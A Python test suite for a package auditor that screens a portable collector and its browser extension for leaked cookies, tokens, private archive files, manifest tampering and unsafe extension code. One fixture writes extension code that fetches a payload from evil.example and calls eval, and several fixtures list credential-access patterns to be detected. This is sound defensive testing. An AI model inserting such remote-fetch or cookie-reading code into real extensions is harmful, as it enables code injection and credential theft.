import json
import io
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch
from contextlib import redirect_stdout


ROOT = Path(__file__).parent
APP = ROOT / "portable" / "app"
sys.path.insert(0, str(APP))


class PackageAuditContractTests(unittest.TestCase):
    def setUp(self):
        try:
            from package_audit import audit_package
        except ModuleNotFoundError:
            self.skip_import_error = True
            self.audit_package = None
        else:
            self.skip_import_error = False
            self.audit_package = audit_package

    def _audit(self, root: Path):
        if self.skip_import_error:
            self.fail("package_audit ainda não existe")
        return self.audit_package(root)

    def _make_runtime_package(self, root: Path) -> None:
        app = root / "app"
        app.mkdir(parents=True, exist_ok=True)
        (app / "extension_exporter.py").write_text("pass", encoding="utf-8")
        (app / "package_complete_archive.py").write_text("pass", encoding="utf-8")
        runtime_file = root / "runtime" / "python.exe"
        runtime_file.parent.mkdir(parents=True, exist_ok=True)
        runtime_file.write_bytes(b"python-fixture")
        license_file = root / "licenses" / "README.md"
        license_file.parent.mkdir(parents=True, exist_ok=True)
        license_file.write_text("Licenças inclusas", encoding="utf-8")
        entries = [
            {
                "path": "runtime/python.exe",
                "size": runtime_file.stat().st_size,
                "sha256": __import__("hashlib").sha256(runtime_file.read_bytes()).hexdigest(),
            },
            {
                "path": "licenses/README.md",
                "size": license_file.stat().st_size,
                "sha256": __import__("hashlib").sha256(license_file.read_bytes()).hexdigest(),
            },
        ]
        (root / "runtime-manifest.json").write_text(
            json.dumps({"schema_version": 1, "build": {"included_files": entries}}),
            encoding="utf-8",
        )

    def _copy_production_extension(self, root: Path) -> Path:
        source = Path(__file__).parent / "portable" / "extensao-complementar-ato"
        destination = root / "extensao-complementar-ato"
        allowed = (
            "manifest.json",
            "package.json",
            "content/package.json",
            "content/form-detector.js",
            "content/portal-navigation.js",
            "content/portal-submit.js",
            "background/service-worker.js",
            "background/automation-controller.js",
            "lib/automation-preflight.js",
            "lib/automation-schema.js",
            "lib/matcher.js",
            "lib/messages.js",
            "lib/bridge-client.js",
            "lib/legal-foundation.js",
            "lib/normalizer.js",
            "lib/schema.js",
            "sidepanel/panel.css",
            "sidepanel/panel.html",
            "sidepanel/panel.js",
            "sidepanel/panel-tokens.css",
            "sidepanel/panel-view.js",
        )
        for relative in allowed:
            target = destination / relative
            target.parent.mkdir(parents=True, exist_ok=True)
            shutil.copyfile(source / relative, target)
        return destination

    def test_rejects_private_archive_profile_pdf_checkpoint_and_part(self):
        forbidden = (
            "dados-locais/Default/Cookies",
            "acervo-tce/processos/fixture-process/evento-fixture/resolucao.pdf",
            "state/checkpoint.json",
            "downloads/file.part",
        )
        for relative in forbidden:
            with self.subTest(relative=relative), tempfile.TemporaryDirectory() as temporary:
                root = Path(temporary)
                target = root / relative
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_bytes(b"fixture")
                report = self._audit(root)
                self.assertFalse(report.ok)
                self.assertTrue(report.findings)

    def test_portable_cmd_launcher_uses_windows_line_endings(self):
        launcher = ROOT / "portable" / "INICIAR.cmd"
        raw = launcher.read_bytes()
        self.assertTrue(raw)
        self.assertNotIn(b"\n", raw.replace(b"\r\n", b""))
        self.assertGreaterEqual(raw.count(b"\r\n"), 1)

    def test_rejects_auth_profile_bridge_backup_and_log_directories(self):
        forbidden = (
            "auth/session.json",
            "profiles/Default/Cookies",
            "dados-locais/bridge/service.json",
            "backups-acervo/old.json",
            "logs/transfer.log",
        )
        for relative in forbidden:
            with self.subTest(relative=relative), tempfile.TemporaryDirectory() as temporary:
                root = Path(temporary)
                target = root / relative
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_bytes(b"fixture")

                report = self.audit_package(root, distribution="private")

                self.assertFalse(report.ok)
                self.assertIn(
                    relative,
                    {finding.path for finding in report.findings},
                )

    def test_rejects_temporary_urls_authorization_tokens_and_cookies_in_text(self):
        samples = (
            "https://host/ConsultaProcessoTemp?id=secret",
            "Authorization: Bearer abc",
            '{"token":"abc"}',
            '{"cookies":"session=abc"}',
        )
        for sample in samples:
            with self.subTest(sample=sample), tempfile.TemporaryDirectory() as temporary:
                root = Path(temporary)
                (root / "README.txt").write_text(sample, encoding="utf-8")
                report = self._audit(root)
                self.assertFalse(report.ok)

    def test_rejects_supported_secret_headers_fields_and_cookie_access(self):
        samples = (
            ('Authorization: "Bearer fixture-secret"', "authorization_present"),
            ("Cookie: fixture-session=value", "credential_field"),
            ("Set-Cookie: fixture-session=value", "credential_field"),
            ('{"access_token":"fixture-secret"}', "credential_field"),
            ('{"refresh_token":"fixture-secret"}', "credential_field"),
            ('const headers = { Authorization: "Bearer fixture-secret" };', "authorization_present"),
            ('const session = { access_token: "fixture-secret" };', "credential_field"),
            ('{"accessToken":"fixture-secret"}', "credential_field"),
            ('const session = { refreshToken: "fixture-secret" };', "credential_field"),
            ('const session = { authToken: "fixture-secret" };', "credential_field"),
            ('headers.set("Authorization", "Bearer fixture-secret")', "authorization_present"),
            ('headers.set("Cookie", "fixture-session=value")', "credential_field"),
            ('request.setRequestHeader("Authorization", "Bearer fixture-secret")', "authorization_present"),
            ('request.setRequestHeader("Cookie", "fixture-session=value")', "credential_field"),
            ("chrome.cookies.getAll({ domain: 'fixture.invalid' })", "credential_access"),
        )
        for sample, expected_code in samples:
            with self.subTest(sample=sample), tempfile.TemporaryDirectory() as temporary:
                root = Path(temporary)
                (root / "fixture.txt").write_text(sample, encoding="utf-8")

                report = self._audit(root)

                self.assertIn(expected_code, {finding.code for finding in report.findings})

    def test_accepts_static_library_as_known_runtime_binary(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "runtime.lib").write_bytes(b"\x00\x94\xfffixture")
            report = self._audit(root)
            self.assertNotIn(
                "binary_unrecognized", {finding.code for finding in report.findings}
            )

    def test_rule_name_without_url_is_not_reported_as_temporary_url(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "audit_rule.py").write_text(
                "TEMPORARY_URL_RE = re.compile(r'consultaprocessotemp')",
                encoding="utf-8",
            )
            report = self._audit(root)
            self.assertNotIn("temporary_url", {finding.code for finding in report.findings})

    def test_rejects_nested_json_credential_fields_case_insensitively(self):
        for field_name in ("Token", "COOKIES"):
            with self.subTest(field_name=field_name), tempfile.TemporaryDirectory() as temporary:
                root = Path(temporary)
                (root / "settings.json").write_text(
                    json.dumps({"session": {field_name: "secret"}}),
                    encoding="utf-8",
                )
                report = self._audit(root)
                self.assertFalse(report.ok)
                self.assertTrue(report.findings)

    def test_rejects_missing_manifest_and_manifest_entry(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            report = self._audit(root)
            self.assertFalse(report.ok)
            self.assertIn("manifest_missing", {finding.code for finding in report.findings})

        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "runtime-manifest.json").write_text(
                json.dumps(
                    {
                        "build": {
                            "included_files": [
                                {
                                    "path": "runtime/python/missing.exe",
                                    "size": 1,
                                    "sha256": "0" * 64,
                                }
                            ]
                        }
                    }
                ),
                encoding="utf-8",
            )
            report = self._audit(root)
            self.assertFalse(report.ok)
            self.assertIn("file_missing", {finding.code for finding in report.findings})

    def test_rejects_non_object_manifest_entry(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            license_file = root / "licenses" / "README.md"
            license_file.parent.mkdir(parents=True)
            license_file.write_text("Licença", encoding="utf-8")
            (root / "runtime-manifest.json").write_text(
                json.dumps({"build": {"included_files": ["not-an-entry"]}}),
                encoding="utf-8",
            )

            report = self._audit(root)

            self.assertFalse(report.ok)
            self.assertIn(
                "manifest_entry_invalid",
                {finding.code for finding in report.findings},
            )

    def test_rejects_invalid_manifest_schema(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            runtime_file = root / "runtime" / "python.exe"
            runtime_file.parent.mkdir(parents=True)
            runtime_file.write_bytes(b"python")
            license_file = root / "licenses" / "README.md"
            license_file.parent.mkdir(parents=True)
            license_file.write_text("Licença", encoding="utf-8")
            import hashlib
            entries = [
                {
                    "path": "runtime/python.exe",
                    "size": runtime_file.stat().st_size,
                    "sha256": hashlib.sha256(runtime_file.read_bytes()).hexdigest(),
                },
                {
                    "path": "licenses/README.md",
                    "size": license_file.stat().st_size,
                    "sha256": hashlib.sha256(license_file.read_bytes()).hexdigest(),
                },
            ]
            (root / "runtime-manifest.json").write_text(
                json.dumps({"schema_version": 99, "build": {"included_files": entries}}),
                encoding="utf-8",
            )

            report = self._audit(root)

            self.assertFalse(report.ok)
            self.assertIn("manifest_schema_invalid", {finding.code for finding in report.findings})

    def test_rejects_empty_manifest_and_missing_runtime_component(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            license_file = root / "licenses" / "README.md"
            license_file.parent.mkdir(parents=True)
            license_file.write_text("Licença", encoding="utf-8")
            (root / "runtime-manifest.json").write_text(
                json.dumps({"schema_version": 1, "build": {"included_files": []}}),
                encoding="utf-8",
            )

            report = self._audit(root)

            self.assertFalse(report.ok)
            self.assertIn("manifest_entries_empty", {finding.code for finding in report.findings})

        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            license_file = root / "licenses" / "README.md"
            license_file.parent.mkdir(parents=True)
            license_file.write_text("Licença", encoding="utf-8")
            import hashlib
            (root / "runtime-manifest.json").write_text(
                json.dumps(
                    {
                        "schema_version": 1,
                        "build": {
                            "included_files": [
                                {
                                    "path": "licenses/README.md",
                                    "size": license_file.stat().st_size,
                                    "sha256": hashlib.sha256(license_file.read_bytes()).hexdigest(),
                                }
                            ]
                        },
                    }
                ),
                encoding="utf-8",
            )

            report = self._audit(root)

            self.assertFalse(report.ok)
            self.assertIn("manifest_runtime_missing", {finding.code for finding in report.findings})

    def test_rejects_duplicate_and_out_of_scope_manifest_paths(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            runtime_file = root / "runtime" / "python.exe"
            runtime_file.parent.mkdir(parents=True)
            runtime_file.write_bytes(b"python")
            license_file = root / "licenses" / "README.md"
            license_file.parent.mkdir(parents=True)
            license_file.write_text("Licença", encoding="utf-8")
            source_file = root / "app" / "README.txt"
            source_file.parent.mkdir(parents=True)
            source_file.write_text("source", encoding="utf-8")
            import hashlib
            runtime_entry = {
                "path": "runtime/python.exe",
                "size": runtime_file.stat().st_size,
                "sha256": hashlib.sha256(runtime_file.read_bytes()).hexdigest(),
            }
            entries = [
                runtime_entry,
                dict(runtime_entry),
                {
                    "path": "app/README.txt",
                    "size": source_file.stat().st_size,
                    "sha256": hashlib.sha256(source_file.read_bytes()).hexdigest(),
                },
                {
                    "path": "licenses/README.md",
                    "size": license_file.stat().st_size,
                    "sha256": hashlib.sha256(license_file.read_bytes()).hexdigest(),
                },
            ]
            (root / "runtime-manifest.json").write_text(
                json.dumps({"schema_version": 1, "build": {"included_files": entries}}),
                encoding="utf-8",
            )

            report = self._audit(root)
            codes = {finding.code for finding in report.findings}

            self.assertFalse(report.ok)
            self.assertIn("manifest_duplicate", codes)
            self.assertIn("manifest_path_scope", codes)

    def test_rejects_reparse_file_and_directory(self):
        for directory_link in (False, True):
            with self.subTest(directory_link=directory_link), tempfile.TemporaryDirectory() as temporary:
                root = Path(temporary)
                target = root / "outside"
                if directory_link:
                    target.mkdir()
                    link = root / "runtime-link"
                    try:
                        link.symlink_to(target, target_is_directory=True)
                    except (OSError, NotImplementedError) as error:
                        self.skipTest(f"symlink indisponível neste Windows: {error}")
                else:
                    target.write_bytes(b"outside")
                    link = root / "runtime-link.exe"
                    try:
                        link.symlink_to(target)
                    except (OSError, NotImplementedError) as error:
                        self.skipTest(f"symlink indisponível neste Windows: {error}")

                report = self._audit(root)

                self.assertFalse(report.ok)
                self.assertIn("reparse_point", {finding.code for finding in report.findings})

    def test_rejects_enumeration_error_with_finding(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            with patch("package_audit.os.scandir", side_effect=OSError("blocked")):
                report = self._audit(root)

            self.assertFalse(report.ok)
            self.assertIn("enumeration_error", {finding.code for finding in report.findings})

    def test_detects_unicode_escaped_json_keys_and_utf16_text(self):
        samples = [
            ("escaped.json", b'{"\\u0074oken":"secret"}'),
            ("utf16-le.txt", '{"token":"secret"}'.encode("utf-16-le")),
            ("utf16-le-bom.txt", b"\xff\xfe" + '{"token":"secret"}'.encode("utf-16-le")),
            ("utf16-be.txt", '{"cookies":"secret"}'.encode("utf-16-be")),
            ("utf16-be-bom.txt", b"\xfe\xff" + '{"cookies":"secret"}'.encode("utf-16-be")),
        ]
        for name, contents in samples:
            with self.subTest(name=name), tempfile.TemporaryDirectory() as temporary:
                root = Path(temporary)
                (root / name).write_bytes(contents)

                report = self._audit(root)

                self.assertFalse(report.ok)
                self.assertIn("credential_field", {finding.code for finding in report.findings})

    def test_rejects_unreadable_binary_with_unallowlisted_extension(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            (root / "payload.bin").write_bytes(b"\x00\xff\x00\x81")

            report = self._audit(root)

            self.assertFalse(report.ok)
            self.assertIn("binary_unrecognized", {finding.code for finding in report.findings})

    def test_accepts_minimal_runtime_when_manifest_hashes_and_licenses_match(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            app = root / "app"
            app.mkdir()
            (app / "extension_exporter.py").write_text("pass", encoding="utf-8")
            (app / "package_complete_archive.py").write_text("pass", encoding="utf-8")
            self._copy_production_extension(root)
            runtime_file = root / "runtime" / "python" / "python.exe"
            runtime_file.parent.mkdir(parents=True)
            runtime_file.write_bytes(b"python-fixture")
            license_file = root / "licenses" / "README.md"
            license_file.parent.mkdir(parents=True)
            license_file.write_text("Licenças inclusas", encoding="utf-8")
            import hashlib
            manifest = {
                "schema_version": 1,
                "build": {
                    "included_files": [
                        {
                            "path": "runtime/python/python.exe",
                            "size": runtime_file.stat().st_size,
                            "sha256": hashlib.sha256(runtime_file.read_bytes()).hexdigest(),
                        },
                        {
                            "path": "licenses/README.md",
                            "size": license_file.stat().st_size,
                            "sha256": hashlib.sha256(license_file.read_bytes()).hexdigest(),
                        },
                    ]
                }
            }
            (root / "runtime-manifest.json").write_text(
                json.dumps(manifest), encoding="utf-8"
            )
            report = self._audit(root)
            self.assertTrue(report.ok, report.findings)

    def test_accepts_manifest_verified_vendor_text_with_library_token_word(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            self._make_runtime_package(root)
            self._copy_production_extension(root)
            vendor_file = root / "runtime" / "vendor" / "tokenizer.py"
            vendor_file.parent.mkdir(parents=True)
            vendor_file.write_text(
                "def parse(token: str) -> str:\n    return token\n",
                encoding="utf-8",
            )
            manifest_path = root / "runtime-manifest.json"
            manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
            manifest["build"]["included_files"].append(
                {
                    "path": "runtime/vendor/tokenizer.py",
                    "size": vendor_file.stat().st_size,
                    "sha256": __import__("hashlib").sha256(
                        vendor_file.read_bytes()
                    ).hexdigest(),
                }
            )
            manifest_path.write_text(json.dumps(manifest), encoding="utf-8")

            report = self._audit(root)

            self.assertTrue(report.ok, report.findings)

    def test_rejects_unlisted_or_modified_manifest_vendor_files(self):
        for case in ("extra", "modified"):
            with self.subTest(case=case), tempfile.TemporaryDirectory() as temporary:
                root = Path(temporary)
                self._make_runtime_package(root)
                self._copy_production_extension(root)
                vendor_file = root / "runtime" / "vendor" / "tokenizer.py"
                vendor_file.parent.mkdir(parents=True)
                vendor_file.write_text("def parse(value): return value\n", encoding="utf-8")
                manifest_path = root / "runtime-manifest.json"
                manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
                manifest["build"]["included_files"].append(
                    {
                        "path": "runtime/vendor/tokenizer.py",
                        "size": vendor_file.stat().st_size,
                        "sha256": __import__("hashlib").sha256(
                            vendor_file.read_bytes()
                        ).hexdigest(),
                    }
                )
                manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
                if case == "extra":
                    (vendor_file.parent / "extra.py").write_text(
                        "def parse(token: str): return token\n", encoding="utf-8"
                    )
                else:
                    vendor_file.write_text("tampered vendor runtime\n", encoding="utf-8")

                report = self._audit(root)
                codes = {finding.code for finding in report.findings}

                self.assertFalse(report.ok)
                self.assertIn(
                    "file_unlisted" if case == "extra" else "hash_divergence",
                    codes,
                )

    def test_allows_dynamic_driver_token_but_rejects_credential_literals(self):
        dynamic_driver = (
            "const currentUser = memory.currentUser;\n"
            "const authHeaders = currentUser && currentUser.token "
            "? { Authorization: currentUser.token } : {};\n"
            "headers.set(\"Authorization\", currentUser.token);\n"
            "return { token: currentUser.token, Authorization: currentUser.token };\n"
        )
        literal_cases = (
            ("const headers = { Authorization: 'Bearer fixture-secret' };", "authorization_present"),
            ('{"token":"fixture-secret"}', "credential_field"),
            ('headers.set("Authorization", "Bearer fixture-secret")', "authorization_present"),
            ("document.cookie", "credential_access"),
        )
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            self._make_runtime_package(root)
            self._copy_production_extension(root)
            (root / "TcePortal.Driver.js").write_text(dynamic_driver, encoding="utf-8")

            report = self._audit(root)

            self.assertTrue(report.ok, report.findings)

        for literal, expected_code in literal_cases:
            with self.subTest(literal=literal), tempfile.TemporaryDirectory() as temporary:
                root = Path(temporary)
                self._make_runtime_package(root)
                self._copy_production_extension(root)
                (root / "TcePortal.Driver.js").write_text(literal, encoding="utf-8")

                report = self._audit(root)

                self.assertIn(expected_code, {finding.code for finding in report.findings})

    def test_rejects_hash_divergence_and_missing_license(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            runtime_file = root / "runtime" / "python" / "python.exe"
            runtime_file.parent.mkdir(parents=True)
            runtime_file.write_bytes(b"tampered")
            manifest = {
                "build": {
                    "included_files": [
                        {
                            "path": "runtime/python/python.exe",
                            "size": 1,
                            "sha256": "0" * 64,
                        }
                    ]
                }
            }
            (root / "runtime-manifest.json").write_text(
                json.dumps(manifest), encoding="utf-8"
            )
            report = self._audit(root)
            self.assertFalse(report.ok)
            codes = {finding.code for finding in report.findings}
            self.assertIn("hash_divergence", codes)
            self.assertIn("license_missing", codes)

    def test_audits_manifest_v3_extension_inventory_and_cli_distribution_modes(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            self._make_runtime_package(root)
            self._copy_production_extension(root)

            public = self._audit(root)
            self.assertTrue(public.ok, public.findings)

            archive = root / "acervo-tce"
            archive.mkdir()
            (archive / "dados-complementar-ato.json").write_text(
                '{"records":[]}', encoding="utf-8"
            )
            (archive / "checkpoint-extracao.json").write_text("{}", encoding="utf-8")
            (archive / "source.pdf").write_bytes(b"pdf")

            public = self._audit(root)
            self.assertFalse(public.ok)
            self.assertIn("private_path", {finding.code for finding in public.findings})
            self.assertIn("forbidden_file", {finding.code for finding in public.findings})

            private = self.audit_package(root, distribution="private")
            self.assertTrue(private.ok, private.findings)

            output = io.StringIO()
            with redirect_stdout(output):
                exit_code = __import__("package_audit").main([str(root), "--distribution", "private"])
            self.assertEqual(exit_code, 0)
            self.assertEqual(json.loads(output.getvalue())["ok"], True)

    def test_public_audit_requires_app_modules_and_extension_when_directories_are_absent(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            self._make_runtime_package(root)
            shutil.rmtree(root / "app")

            report = self.audit_package(root, distribution="public")

            self.assertFalse(report.ok)
            findings = {(finding.code, finding.path) for finding in report.findings}
            self.assertIn(("app_file_missing", "app/extension_exporter.py"), findings)
            self.assertIn(("app_file_missing", "app/package_complete_archive.py"), findings)
            self.assertIn(
                ("extension_missing", "extensao-complementar-ato"), findings
            )

    def test_rejects_extension_permission_remote_code_dynamic_code_and_unlisted_file(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            self._make_runtime_package(root)
            extension = self._copy_production_extension(root)
            manifest_path = extension / "manifest.json"
            manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
            manifest["permissions"] = ["storage", "sidePanel", "tabs"]
            manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
            (extension / "sidepanel" / "extra.js").write_text(
                "fetch('https://evil.example/payload'); eval('x'); new Function('return 1');",
                encoding="utf-8",
            )

            report = self._audit(root)
            codes = {finding.code for finding in report.findings}
            self.assertFalse(report.ok)
            self.assertIn("extension_permissions", codes)
            self.assertIn("extension_file_unlisted", codes)
            self.assertIn("extension_remote_code", codes)
            self.assertIn("extension_dynamic_code", codes)

    def test_validates_all_supported_manifest_file_references(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            self._make_runtime_package(root)
            extension = self._copy_production_extension(root)
            manifest_path = extension / "manifest.json"
            manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
            manifest["content_scripts"][0]["css"] = ["content/missing.css"]
            manifest["action"]["default_popup"] = "popup/missing.html"
            manifest["action"]["default_icon"] = {"16": "icons/action-missing.png"}
            manifest["icons"] = {"32": "icons/missing.png"}
            manifest["web_accessible_resources"] = [{
                "resources": ["assets/missing.js"],
                "matches": ["https://novaarearestrita.tce.rn.gov.br/*"],
            }]
            manifest["chrome_url_overrides"] = {"newtab": "pages/missing.html"}
            manifest["options_ui"] = {"page": "options/missing.html"}
            manifest["devtools_page"] = "devtools/missing.html"
            manifest["sandbox"] = {"pages": ["sandbox/missing.html"]}
            manifest["declarative_net_request"] = {"rule_resources": [{
                "id": "fixture",
                "enabled": True,
                "path": "rules/missing.json",
            }]}
            manifest["storage"] = {"managed_schema": "schemas/missing.json"}
            manifest["theme"] = {"images": {"theme_frame": "images/theme-missing.png"}}
            manifest["default_locale"] = "fixture-locale"
            manifest_path.write_text(json.dumps(manifest), encoding="utf-8")

            report = self.audit_package(root, distribution="public")

            missing = {
                finding.path
                for finding in report.findings
                if finding.code == "extension_file_missing"
            }
            for relative in (
                "content/missing.css",
                "popup/missing.html",
                "icons/action-missing.png",
                "icons/missing.png",
                "assets/missing.js",
                "pages/missing.html",
                "options/missing.html",
                "devtools/missing.html",
                "sandbox/missing.html",
                "rules/missing.json",
                "schemas/missing.json",
                "images/theme-missing.png",
                "_locales/fixture-locale/messages.json",
            ):
                self.assertIn(f"extensao-complementar-ato/{relative}", missing)

    def test_rejects_unsafe_manifest_file_references(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            self._make_runtime_package(root)
            extension = self._copy_production_extension(root)
            manifest_path = extension / "manifest.json"
            manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
            manifest["action"]["default_popup"] = "https://fixture.invalid/popup.html"
            manifest["icons"] = {"16": "../outside.png"}
            manifest_path.write_text(json.dumps(manifest), encoding="utf-8")

            report = self.audit_package(root, distribution="public")

            self.assertIn(
                "extension_declared_file_invalid",
                {finding.code for finding in report.findings},
            )

    def test_rejects_invalid_optional_manifest_file_section_types(self):
        invalid_sections = (
            ("action", []),
            ("options_ui", []),
            ("storage", []),
            ("theme", []),
            ("chrome_url_overrides", []),
            ("sandbox", []),
            ("web_accessible_resources", {}),
            ("declarative_net_request", []),
        )
        for section, invalid_value in invalid_sections:
            with self.subTest(section=section), tempfile.TemporaryDirectory() as temporary:
                root = Path(temporary)
                self._make_runtime_package(root)
                extension = self._copy_production_extension(root)
                manifest_path = extension / "manifest.json"
                manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
                manifest[section] = invalid_value
                manifest_path.write_text(json.dumps(manifest), encoding="utf-8")

                report = self.audit_package(root, distribution="public")

                self.assertIn(
                    "extension_declared_file_invalid",
                    {finding.code for finding in report.findings},
                )

    def test_private_mode_rejects_data_outside_acervo_and_public_is_default(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            self._make_runtime_package(root)
            (root / "acervo-tce" / "dados-complementar-ato.json").parent.mkdir()
            (root / "acervo-tce" / "dados-complementar-ato.json").write_text(
                '{"records":[]}', encoding="utf-8"
            )
            (root / "state" / "checkpoint.json").parent.mkdir()
            (root / "state" / "checkpoint.json").write_text("{}", encoding="utf-8")
            (root / "state" / "archive.pdf").write_bytes(b"pdf")
            (root / "dados-locais").mkdir()

            report = self.audit_package(root, distribution="private")
            codes = {finding.code for finding in report.findings}
            self.assertFalse(report.ok)
            self.assertIn("private_path", codes)
            self.assertIn("checkpoint_present", codes)
            self.assertIn("forbidden_file", codes)

            default_report = self._audit(root)
            self.assertIn("private_path", {finding.code for finding in default_report.findings})

    def test_private_audit_rejects_generic_data_areas_outside_acervo(self):
        for relative in (
            "state/export.json",
            "cache/records.json",
            "local-store/records.json",
        ):
            with self.subTest(relative=relative), tempfile.TemporaryDirectory() as temporary:
                root = Path(temporary)
                self._make_runtime_package(root)
                self._copy_production_extension(root)
                archive = root / "acervo-tce"
                archive.mkdir()
                (archive / "dados-complementar-ato.json").write_text(
                    '{"records":[]}', encoding="utf-8"
                )
                target = root / relative
                target.parent.mkdir()
                target.write_text('{"fixture":true}', encoding="utf-8")

                report = self.audit_package(root, distribution="private")

                self.assertIn(
                    "private_data_path", {finding.code for finding in report.findings}
                )

    def test_public_audit_rejects_nested_acervo_component(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            self._make_runtime_package(root)
            self._copy_production_extension(root)
            private_file = root / "state" / "acervo-tce" / "records.json"
            private_file.parent.mkdir(parents=True)
            private_file.write_text('{"fixture":true}', encoding="utf-8")

            report = self.audit_package(root, distribution="public")

            self.assertIn("private_path", {finding.code for finding in report.findings})

    def test_private_audit_rejects_acervo_component_below_public_trees(self):
        for relative in (
            "app/acervo-tce/records.json",
            "extensao-complementar-ato/acervo-tce/records.json",
        ):
            with self.subTest(relative=relative), tempfile.TemporaryDirectory() as temporary:
                root = Path(temporary)
                self._make_runtime_package(root)
                self._copy_production_extension(root)
                archive = root / "acervo-tce"
                archive.mkdir()
                (archive / "dados-complementar-ato.json").write_text(
                    '{"records":[]}', encoding="utf-8"
                )
                target = root / relative
                target.parent.mkdir(parents=True)
                target.write_text('{"fixture":true}', encoding="utf-8")

                report = self.audit_package(root, distribution="private")

                findings = {
                    (finding.code, finding.path) for finding in report.findings
                }
                self.assertIn(("private_data_path", relative), findings)

    def test_private_audit_requires_extension_dataset_and_manifest_host_is_exact(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            self._make_runtime_package(root)
            extension = self._copy_production_extension(root)
            manifest_path = extension / "manifest.json"
            manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
            manifest["content_scripts"][0]["matches"] = ["https://evil.example/*"]
            manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
            (root / "acervo-tce").mkdir()

            report = self.audit_package(root, distribution="private")
            codes = {finding.code for finding in report.findings}
            self.assertFalse(report.ok)
            self.assertIn("private_data_missing", codes)
            self.assertIn("extension_hosts", codes)

    def test_validates_progress_snapshot_revision_and_entries(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            progress = root / "acervo-tce" / "progresso.json"
            progress.parent.mkdir(parents=True)
            progress.write_text(
                json.dumps(
                    {
                        "schema_version": 1,
                        "revision": "broken",
                        "processes": {"103439/2023": {"completed": True}},
                    }
                ),
                encoding="utf-8",
            )

            report = self.audit_package(root, distribution="private")

            self.assertIn("progress_invalid", {finding.code for finding in report.findings})

    def test_validates_archive_reference_and_document_hash(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            archive = root / "acervo-tce"
            pdf = archive / "processos" / "ação" / "documento.pdf"
            pdf.parent.mkdir(parents=True)
            pdf.write_bytes(b"%PDF-fixture")
            metadata = archive / "processos" / "ação" / "evento.json"
            metadata.write_text(
                json.dumps(
                    {
                        "documents": [
                            {
                                "path": "processos/ação/documento.pdf",
                                "sha256": "0" * 64,
                            },
                            {
                                "path": "processos/ação/ausente.pdf",
                                "sha256": "1" * 64,
                            },
                        ]
                    }
                ),
                encoding="utf-8",
            )

            report = self.audit_package(root, distribution="private")
            codes = {finding.code for finding in report.findings}

            self.assertIn("hash_divergence", codes)
            self.assertIn("reference_missing", codes)


class PackagerContractTests(unittest.TestCase):
    def test_private_wrapper_uses_quiescent_transfer_helper(self):
        wrapper = (ROOT / "portable" / "Empacotar-Acervo-Completo.ps1").read_text(
            encoding="utf-8-sig"
        )

        self.assertIn("prepare_transfer.py", wrapper)
        self.assertIn("--source", wrapper)
        self.assertNotIn("[switch]$Force", wrapper)

    def test_private_wrapper_delegates_audit_to_filtered_python_builder(self):
        wrapper = (ROOT / "portable" / "Empacotar-Acervo-Completo.ps1").read_text(
            encoding="utf-8-sig"
        )

        self.assertIn("$packager", wrapper)
        self.assertIn("--distribution", wrapper)
        self.assertNotIn("$auditOutput", wrapper)
        self.assertNotIn("& $python $auditor", wrapper)

    def test_public_packager_refuses_existing_output_without_force(self):
        powershell = shutil.which("powershell.exe") or shutil.which("powershell")
        if powershell is None:
            self.skipTest("PowerShell não disponível")
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "existing.zip"
            destination.write_bytes(b"preserve-fixture")

            result = subprocess.run(
                [
                    powershell,
                    "-NoProfile",
                    "-NonInteractive",
                    "-File",
                    str(ROOT / "empacotar-coletor-portatil.ps1"),
                    "-OutputPath",
                    str(destination),
                ],
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
            )

            self.assertNotEqual(result.returncode, 0)
            self.assertIn("ZIP existente", result.stdout + result.stderr)
            self.assertEqual(destination.read_bytes(), b"preserve-fixture")

    def test_packager_is_transactional_and_uses_verified_runtime_sources(self):
        packager = (ROOT / "empacotar-coletor-portatil.ps1").read_text(
            encoding="utf-8-sig"
        )

        self.assertIn("tce-processos-completo-portatil.zip", packager)
        self.assertIn("staging-task5-verified", packager)
        self.assertIn("package_audit", packager)
        self.assertIn("Compress-Archive", packager)
        self.assertIn("Expand-Archive", packager)
